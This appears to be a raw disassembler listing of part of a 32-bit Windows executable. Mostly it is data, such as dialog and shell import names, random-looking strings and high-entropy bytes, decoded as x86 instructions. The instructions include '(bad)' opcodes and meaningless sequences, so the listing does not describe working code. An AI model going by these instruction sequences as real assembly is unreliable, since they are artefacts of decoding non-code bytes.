  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   st(3)
  414b73:	inc    ebp
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [eax+edx*1+0x49590043],dh
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	fsub   DWORD PTR [eax]
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fst    DWORD PTR [edi]
  414e41:	or     eax,0xe58c11c6
  414e46:	add    BYTE PTR [eax],al
  414e48:	cmc    
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    BYTE PTR [esi],al
  414e4d:	loope  0x414e74
  414e4f:	jmp    0x414e4b
  414e51:	adc    bl,bl
  414e53:	mov    edx,0xccb8d5fb
  414e58:	in     al,dx
  414e59:	mov    esi,0xec130283
  414e5e:	mov    edi,0x83e969da
  414e63:	mov    ecx,0x2178a0f6
  414e68:	test   BYTE PTR [ecx+0x71339a82],ah
  414e6e:	loopne 0x414e4f
  414e70:	xchg   esp,eax
  414e71:	outs   dx,DWORD PTR ds:[esi]
  414e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e73:	add    dl,al
  414e75:	and    eax,0xf6bb7d86
  414e7a:	sti    
  414e7b:	xchg   ecx,eax
  414e7c:	fcomp  DWORD PTR [ebp-0x5cc9bdf1]
  414e82:	mov    esi,0x84fbacc4
  414e87:	adc    eax,0xfdc7723d
  414e8c:	pusha  
  414e8d:	inc    ebx
  414e8e:	cmp    dh,bh
  414e90:	pop    ebx
  414e91:	cld    
  414e92:	es (bad) 
  414e95:	pop    esp
  414e96:	fidiv  WORD PTR ds:0xecb63ba7
  414e9c:	das    
  414e9d:	and    ch,al
  414e9f:	test   BYTE PTR [edi+0x14],0x67
  414ea3:	je     0x414e2b
  414ea5:	pop    esi
  414ea6:	xor    edi,DWORD PTR [ebx]
  414ea8:	xchg   ecx,eax
  414ea9:	push   edx
  414eaa:	sbb    DWORD PTR [ebx],ebx
  414eac:	xchg   edi,eax
  414ead:	inc    ch
  414eaf:	out    0xbc,eax
  414eb1:	xlat   BYTE PTR ds:[ebx]
  414eb2:	repnz (bad) 
  414eb4:	cs ret 
  414eb6:	ins    DWORD PTR es:[edi],dx
  414eb7:	out    0xfd,al
  414eb9:	jae    0x414e45
  414ebb:	in     eax,dx
  414ebc:	mov    es,WORD PTR [edi]
  414ebe:	add    esp,DWORD PTR [ebx+0x3af31270]
  414ec4:	(bad)  
  414ec5:	shr    edi,1
  414ec7:	dec    edx
  414ec8:	mov    bl,0x6a
  414eca:	xor    al,0xe0
  414ecc:	xor    al,0xfa
  414ece:	je     0x414ed3
  414ed0:	push   ebp
  414ed1:	fbstp  TBYTE PTR [ecx+0x37]
  414ed4:	sbb    BYTE PTR [esp+ebx*4],0x75
  414ed8:	rcr    DWORD PTR [esi+0x71],cl
  414edb:	pop    edx
  414edc:	imul   BYTE PTR [esi+ecx*2-0x2dbed9c7]
  414ee3:	and    cl,BYTE PTR [eax+0x6f]
  414ee6:	(bad)  
  414ee7:	stc    
  414ee8:	push   ds
  414ee9:	and    cl,BYTE PTR [eax-0x5a19e4d4]
  414eef:	jge    0x414f2e
  414ef1:	jbe    0x414eb3
  414ef3:	add    ebp,DWORD PTR [ebx-0xe]
  414ef6:	iret   
  414ef7:	nop
  414ef8:	out    0x93,eax
  414efa:	arpl   WORD PTR [edi],cx
  414efc:	test   eax,0xea3cdbb9
  414f01:	fmul   QWORD PTR [edi]
  414f03:	jne    0x414eeb
  414f05:	sub    BYTE PTR [edi+0xb],0xfc
  414f09:	dec    ecx
  414f0a:	xlat   BYTE PTR ds:[ebx]
  414f0b:	test   eax,0x4686369a
  414f10:	xor    ah,dl
  414f12:	inc    edi
  414f13:	loop   0x414f59
  414f15:	and    ebp,DWORD PTR [ebx]
  414f17:	mov    eax,?
  414f19:	xor    esi,ecx
  414f1b:	ret    
  414f1c:	xlat   BYTE PTR ds:[ebx]
  414f1d:	dec    esi
  414f1e:	jbe    0x414ea0
  414f20:	repz rcl BYTE PTR [ebp-0x1fa5cf74],cl
  414f27:	into   
  414f28:	lods   eax,DWORD PTR ds:[esi]
  414f29:	mov    gs,WORD PTR [ebp+0x146aa102]
  414f2f:	inc    ebp
  414f30:	dec    esi
  414f31:	push   esp
  414f32:	cmp    ebp,0xffffffd6
  414f35:	(bad)  
  414f37:	mov    ecx,0xff78d57f
  414f3c:	sti    
  414f3d:	jle    0x414f2e
  414f3f:	inc    eax
  414f40:	xchg   ecx,eax
	...
  414fb1:	add    BYTE PTR [eax],al
  414fb3:	add    BYTE PTR [edx-0x26],bl
  414fb6:	push   esi
  414fb7:	pusha  
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x4b2f
  414fc2:	scas   eax,DWORD PTR es:[edi]
  414fc3:	sub    eax,DWORD PTR [ecx-0xaffff1a]
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	add    BYTE PTR [ecx+0x344067fd],bl
  414fd1:	mov    ds:0xef8a09b9,al
  414fd6:	das    
  414fd7:	bswap  edx
  414fd9:	dec    ebp
  414fda:	dec    ebp
  414fdb:	jle    0x415006
  414fdd:	cli    
  414fde:	adc    BYTE PTR [edi],ch
  414fe0:	shl    cl,0x62
  414fe3:	mov    ebx,DWORD PTR [ebx+ebx*8+0x12a722f3]
  414fea:	push   0x5f627b3b
  414fef:	push   0xffffffdb
  414ff1:	sahf   
  414ff2:	xor    al,0x25
  414ff5:	aas    
  414ff6:	js     0x415000
  414ff8:	shl    cl,cl
  414ffa:	adc    al,0xf8
  414ffc:	pop    ds
  414ffd:	call   0x51d20526
  415002:	sub    al,0xf1
  415004:	ss nop
  415006:	or     eax,0x6b03197
  41500b:	xor    ch,cl
  41500d:	cmc    
  41500e:	and    BYTE PTR [ebp+0x45],bh
  415011:	mov    ebp,0x6f697e74
  415016:	sbb    eax,DWORD PTR [ebx-0x430b6103]
  41501c:	push   ds
  41501d:	loope  0x414fdb
  41501f:	daa    
  415020:	cs xchg edi,eax
  415022:	sub    DWORD PTR [esi-0x71],0xffffffbd
  415026:	mov    WORD PTR [edx],?
  415028:	ficomp DWORD PTR [ebx]
  41502a:	and    ah,bh
  41502c:	arpl   WORD PTR [esp+eiz*4+0x5d],bp
  415030:	mov    edx,0x6bd6a3dd
  415035:	loope  0x41505a
  415037:	test   DWORD PTR [edi+0x6761ec84],edx
  41503d:	xchg   edx,eax
  41503e:	or     bh,BYTE PTR gs:[ebp+0x7851b04a]
  415045:	loope  0x414fce
  415047:	jne    0x41504f
  415049:	xchg   edi,eax
  41504a:	mov    ds:0x2132379a,eax
  41504f:	out    0xec,eax
  415051:	outs   dx,BYTE PTR ds:[esi]
  415052:	push   ds
  415053:	sub    DWORD PTR [edx+0x83a1030],eax
  415059:	pop    esi
  41505a:	cdq    
  41505b:	dec    esp
  41505c:	dec    esp
  41505d:	or     al,0x5c
  41505f:	sahf   
  415060:	mov    eax,ds:0x189af3f5
  415065:	pop    es
  415066:	ror    esp,1
  415068:	jmp    0x6bad1483
  41506d:	push   0xff0cb43e
  415072:	loopne 0x414ff5
  415074:	rcr    BYTE PTR [ebx],1
  415076:	push   cs
  415077:	mov    eax,ds:0x4704d587
  41507c:	scas   al,BYTE PTR es:[edi]
  41507d:	ret    
  41507e:	mov    ah,0xc5
  415080:	push   edx
  415081:	jns    0x4150b4
  415083:	jp     0x415097
  415085:	dec    eax
  415086:	jb     0x4150b8
  415088:	and    ecx,DWORD PTR [edi+0x3b358b9a]
  41508e:	test   BYTE PTR [eax+0x233e43ed],al
  415094:	shl    DWORD PTR [esi-0x14db3e2d],1
  41509a:	repz mov ebx,0xa21c8bb7
  4150a0:	jns    0x41507c
  4150a2:	mov    WORD PTR [ebx],?
  4150a4:	and    bl,BYTE PTR [ebp+0x36]
  4150a7:	sbb    BYTE PTR [edx+0x1caab6e1],bl
  4150ad:	(bad)  
  4150ae:	aam    0x5b
  4150b0:	mov    ah,0xc5
  4150b2:	inc    esi
  4150b3:	loop   0x4150fe
